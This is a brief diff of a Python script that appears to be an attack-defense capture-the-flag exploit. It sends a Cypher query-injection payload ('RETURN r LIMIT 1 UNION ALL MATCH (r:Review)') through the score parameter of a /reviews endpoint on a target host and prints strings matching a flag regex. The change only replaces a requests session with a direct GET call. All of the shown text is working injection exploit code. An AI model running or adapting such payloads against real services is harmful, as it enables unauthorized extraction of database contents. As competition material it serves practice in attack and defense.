@@ -27,8 +27,7 @@ flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')
 host = sys.argv[1]
 
 def main():
-	s = requests.session()
-	resp = s.get(f'http://{host}/reviews?score=1+ReTURn+r+LIMIT+1+UNION+ALL+MATCH+%28r%3AReview%29')
+	resp = requests.get(f'http://{host}/reviews?score=1+ReTURn+r+LIMIT+1+UNION+ALL+MATCH+%28r%3AReview%29')
 	[print(i) for i in flagRegEx.findall( resp.text )]
 
 
